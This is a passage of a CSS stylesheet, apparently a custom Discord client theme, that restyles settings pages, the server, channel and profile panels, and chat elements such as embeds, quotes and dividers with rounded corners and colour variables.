    margin-right: 60px;
    width: 175px;
}
/* Buy Nitro Classic | Buttons */

.buttons-2-EdE8 {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    justify-content: center;
}

/* Info */

.finePrint-ULGqdp {
    border: none;
}

.finePrint-ULGqdp {
    background: var(--Color005);
    border-radius: 24px;
    padding: 24px;
    font-size: 13px;
    line-height: 16px;
    text-align: justify;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Gift Inventory ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/



/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Server Boost ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Active Server Boost */

.guildHeader-3nh5RK {
    border-radius: 24px 24px 0 0;
    background-color: var(--Color003);
}

.guildSubscriptionSlots-JPXXvN {
    background-color: var(--Color003);
}

.guildHeaderBackground-1G51bM {
    display: none;
}

/* Icons */

.memberBadgeIcon-1hpSQc, .roleIcon-F8XDd3, .emojiIcon-2xOPMD, .audioQualityIcon-1KNkhv, .uploadSizeIcon-2HNa5p {
    color: var(--Color001);
}

/* Cards */

.cardWrapper-2Min21 {
    border-radius: 24px;
}

/* No Logo */

.marketingLogo-1D8DV6 {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | HypeSquad |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.membershipDialogHouse2-35h9SY {
    background-color: var(--Color001);
    border-radius: 24px;
}

.videoWrapper-3YdgHH {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Voice & Video |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.videoGridWrapper-2BDlMX {
    background: #000;
}

/* Grabber */

.grabber-3mFHz2 {
    background-color: var(--Color006);
    border-radius: 90px;
    height: 16px;
    width: 16px;
    margin-top: -8.5px;
    margin-left: -5px;
}

/* Mic Test */

.theme-dark .notches-1sAcEM.gray-3_LNYR {
    display: none;

}

.theme-dark .progress-1IcQ3A, .wrapper-3Z-vWm {
    background: var(--Color003);

}

.wrapper-3Z-vWm {
    background: var(--Color003);

}

/* Preview */

.theme-dark .userSettingsVoice-iwdUCU .previewOverlay-2O7_KC {
    background: var(--Color005);
    border-radius: 24px;
}

.userSettingsVoice-iwdUCU .media-engine-video {
    border-radius: 24px;
    border: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Overlay |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Notifications |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Keybinds ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Game Activity |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-dark .card-FDVird{
    background: var(--Color003);
    border-radius: var(--Radius002);
    box-shadow: none;
}

.theme-dark .card-FDVird::before{
    background: var(--Color003);
    border-radius: var(--Radius002);
    box-shadow: none;
}

/* Add Game */

.theme-dark .notDetected-33MY4s, .theme-light .notDetected-33MY4s {
    background: var(--Color002);
    border-radius: var(--Radius002);

}

/* Game */

.game-1ipmAa {
    position: relative;
    padding: 20px;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Text & Images |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Appearance ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Streamer Mode |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Language ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .codeRedemptionRedirect-1wVR4b {
    color: var(--Color007);
    background: var(--Color005);
    border: none;
}

.theme-dark .item-3eFBNF.selected-2DeaDa {
    background: var(--Color002);
    border-radius: var(--Radius002);
    box-shadow: none;
}

.theme-dark .item-3eFBNF {
    background: var(--Color003);
    border-radius: var(--Radius002);
    margin-top: 20px;
    padding: 20px;
    box-shadow: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| App Settings | Windows Settings ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Settings | Change Log ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* No Guild Separator */

#app-mount .wrapper-1Rf91z.guilds-1SWlCJ .guildSeparator-3s64Iy {
    display: none;
}

/* Background */

.guilds-1SWlCJ .scroller-2TZvBN {
    padding-top: 80px;
    padding-bottom: 80px;
}

.wrapper-1Rf91z {
    background-color: transparent;
}

.scroller-2TZvBN {
    background-color: var(--Color004);
	border-radius: 0 38px 38px 0;
	margin-bottom: 25px;
	margin-top: 12px;
    contain: unset !important;
}

.layer-3QrUeG.baseLayer-35bLyl {
    background: var(--Color003);
}

/* Button Color */

.childWrapper-anI2G9 {
    background: var(--Color003);
    color: var(--Color008);
}

.circleIconButton-jET_ig {
    color: var(--Color008);
    background-color: var(--Color003);
}

/* Home Button */

.tutorialContainer-1v44GL {
    background: var(--Color005);
	border-radius: 0 90px 90px 0;
    position: fixed;
    z-index: 3;
	padding-bottom: 4px;
    padding-top: 10px;
    top:calc(var(--titlebar-height) + 13px);
    margin-top: 11.6px;
}

/* Create Server Button */

.tutorialContainer-SGrQ1h {
    background: var(--Color005);
	border-radius: 0 90px 90px 0;
    position: fixed;
    z-index: 3;
	padding-bottom: 4px;
    padding-top: 12px;
    margin-bottom: 23px;
    bottom: calc(var(--titlebar-height) -0px);
}


/* Closed Folder */

.closedFolderIconWrapper-15K9MK {
    background: var(--Color004);
}

/* Open Folder */

.folder-21wGz3 {
    border-radius: 90px;
    background-color: var(--Color002);
}

.expandedFolderBackground-2sPsd- {
    background: var(--Color003);
    border-radius: 90px;
}

/* Round Home Button */

.wrapper-1BJsBx.selected-bZ3Lue .childWrapper-anI2G9, .wrapper-1BJsBx:hover .childWrapper-anI2G9 {
    background: var(--Color001);
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Channel Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.container-PNkimc {
    background: var(--Color003);
}

/* background */

.clickable-2ap7je {
    background: var(--Color004);
}

.clickable-2ap7je {
	border-radius: 24px 24px 0 0;
}

.clickable-2ap7je .header-2o-2hj {
    background: transparent;
    height: 46px;
}

.animatedContainer-1pJv5C, .bannerImage-1jOskm {
	z-index: 2;
	border-radius: 24px;
    position: absolute;
    height: 120px;
}

.sidebar-2K8pFh {
    width: 236px;
}

.scroller-2wx7Hm {
    background: var(--Color004);
	padding-bottom: 30px;
    border-radius: 0px;
    margin-bottom: -30px;
}

/* Content */

.containerDefault-1ZnADq, .clickable-18m--O {
	padding-right: 8px;
}

/* Selector */

.modeSelected-1zApJ_ .content-3at_AU, .modeSelected-1zApJ_:hover .content-3at_AU {
    background-color: var(--Color003);
	border-radius: 90px;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Profile Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Game */

.panel-24C3ux {
	z-index: 9;
	position: relative;
    background: var(--Color005);
    border-radius: var(--Radius001) var(--Radius001) 0 0;
    padding-bottom: 80px;
    margin-bottom: -70px;
}

/* Voice */

.container-1giJp5 {
	z-index: 9;
    position: relative;
    background: var(--Color005);
	border-radius: var(--Radius001);
    padding-bottom: 80px;
    margin-bottom: -70px;

}

.button-1YfofB.buttonColor-7qQbGO {
    background-color: var(--Color003);
    color: var(--Color007);
}

/* Profile */

.container-3baos1 {
	z-index: 9;
	position: relative;
	background: var(--Color005);
	border-radius: var(--Radius001);
}

.panels-j1Uci_ {
	background: var(--Color003);
}
/* Profile Hover */

.panels-j1Uci_ > .container-3baos1:hover button.button-14-BFJ{
  display: block;
}

.panels-j1Uci_ > .container-3baos1 button[aria-checked="false"], .panels-j1Uci_ > .container-3baos1 button:not([role="switch"]) {
  display: none;
}

/* Game Icon */

.gameIcon-gg34Dz, .icon-3Oovq9 {
    border-radius: var(--Radius002);
    color: var(--Color006);
}

/* No Shaddow */

.panels-j1Uci_ > .container-3baos1:last-child .nameTag-3uD-yy {
    text-shadow: none;
}


.panels-j1Uci_ > .container-3baos1:last-child .avatar-SmRMf2.wrapper-3t9DeA, .panels-j1Uci_ > .container-3baos1:last-child .nameTag-3uD-yy, .panels-j1Uci_ > .container-3baos1:last-child .button-38aScr {
    filter: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Topic Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* No Divider */

.content-yTz4x3:before, .divider-3FBTu8{
    display: none;
}

:root{
    --elevation-low: none;
}

.channelNotice-3DDmsB{
    box-shadow: none;
}

.attachWrapper-2TRKBi, .panel-24C3ux, .peopleListItem-2nzedh, .rowWrapper-2fB6P0+.rowWrapper-2fB6P0 .row-ZLfFhY, .header-39GIC8, .headerCell-3L6rFG{
    border: none;
}

/* Channel Info */

.children-19S4PO {
	background: var(--Color004);
	border-radius: 90px;
	Padding: 6px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Tool Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.toolbar-1t6TWx {
	background: var(--Color004);
	border-radius: 90px;
    Padding: 6px;
    margin-left: 20px;
}

.container-1r6BKw {
    padding-right: 12px;
    padding-left: 0px;
}

/* Selected Icon */

.selected-1GqIat .icon-22AiRD {
    color: var(--Color006);
}

/* Update Icon */

.updateIconForeground-3tnNZn {fill: var(--Color010)}
.updateIconForeground-3tnNZn:hover {fill: var(--Color010)}
.updateIconForeground-3tnNZn:active {fill: var(--Color010)}

/* Searchbar */

.searchBar-3dMhjb {
    background: transparent;
}

/* Follow Button */

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6 {
    background: var(--Color001);
}

.container-1r6BKw.themed-ANHk51 {
    background: var(--Color003);
	height: 60px;
}

.header-2o-2hj {
    position: relative;
    font-weight: 500;
    padding: 0 16px;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    z-index: 3;
    -webkit-transition: background-color .1s linear;
    transition: background-color .1s linear;
    color: var(--header-primary);
    -webkit-box-shadow: var(--elevation-low);
    box-shadow: var(--elevation-low);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.content-yTz4x3 {
    padding-right: 12px;
}

.chatContent-a9vAAp {
    background-color: var(--Color004);
	border-radius: 24px;
	margin-bottom: 28px;
}

.content-yTz4x3 {
    background-color: var(--Color003);
}



/* No Scrollbar*/

.scrollerBase-289Jih::-webkit-scrollbar{
    display: none;
}

/* Reaction */

.reaction-1hd86g {
    background: var(--Color003);
    border-radius: 1rem;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Round Media |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Round Image */

.imageWrapper-2p5ogY {
    border-radius: 24px;
}

/* Round video */

.wrapper-2TxpI8 {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Embed |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.embedFull-2tM8-- {
    background: var(--Color005);
    border-top-right-radius: 24px;
	border-bottom-right-radius: 24px;
    border-left: 5px solid var(--Color001);
}

.embedAuthorName-3mnTWj, .embedAuthorNameLink-1gVryT, .embedDescription-1Cuq9a, .embedFieldName-NFrena, .embedFieldValue-nELq2s, .embedFooterText-28V_Wb, .embedLink-1G1K1D, .embedProvider-3k5pfl, .embedTitle-3OXDkz, .embedTitleLink-1Zla9e {
    text-align: left;
}

.imageWrapper-2p5ogY {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Mention |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

#app-mount .chat-3bRxxu .messagesWrapper-3lZDfY .cozyMessage-3V1Y8y:not(.groupStart-23k01U) {
  padding-bottom: 20px;
  margin-top: -22px;
  border-bottom-right-radius: 24px;
  border-bottom-left-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Quotes like embeds ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .blockquoteContainer-U5TVEi blockquote {
    background-color: var(--Color003);
    border-color: var(--Color003);

}

.blockquoteContainer-U5TVEi blockquote {
    border: 2px solid;
    border-top-right-radius: 24px;
 	border-bottom-right-radius: 24px;
    padding: 8px 12px 4px;
   	margin-bottom: 20px;

}

.blockquoteContainer-U5TVEi .blockquoteDivider-2hH8H6 {
    border-radius: 4px 0px 0px 4px;
  	background-color: var( --Color001);
    margin-bottom: 20px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Download ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.attachment-33OFj0 {
    border: none;
    background-color: var(--Color005);
	border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | New Message |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.unreadPill-2HyYtt{
	background: var(--Color001);
    border-radius: 90px;
    padding: 6px;

margin-right: -2px;
    width: 3%;
}

.unreadPillCap-3_K2q2{
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Message Divider |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

:root .divider-JfaTT5{
    border:  1px solid var(--Color001);
    margin-left: 0px;
    margin-right: 22px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Time Divider ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.content-1o0f9g {
    background: var(--Color003);
    border-radius: 90px;
    width: 100%;
    padding: 8px;
    text-align: center;
	padding-right: 50px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | New Member ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Text */

.content-2M3n_H {
	padding-left: 34px;
}

/* Icon */

.iconContainer-3GkGRf {
    position: absolute;
    left: 4px;
    padding-top: .16rem;
}

/* Background */

.container-3-pyIM {
	background: var(--Color003);
	border-radius: 90px;
	padding: 8px
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Code Menu |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.markup-2BOw-j code {
    background: var(--Color005);
    border: transparent;
    border-radius: 8px;
}

.hljs .powercord-lines:after {
    padding-right: 8px;
    left: 3px;
    border-right: 1px solid var(--Color005);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Emoji Info ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.emojiSection-3Fb9ix {
    background: var(--Color005);

}

.container-ZRw2kD {
    width: auto;
    border-radius: 24px;
	box-shadow: 0px 8px 12px -2px var(--Color005);
}

.guildSection-1EoFKd {
    background: var(--Color004);
    padding: 16px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Follow Channel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.wrapper-39oAo3 {
    background-color: var(--Color005);
    border-radius: var(--Radius001);
    margin-bottom: 0px;
}

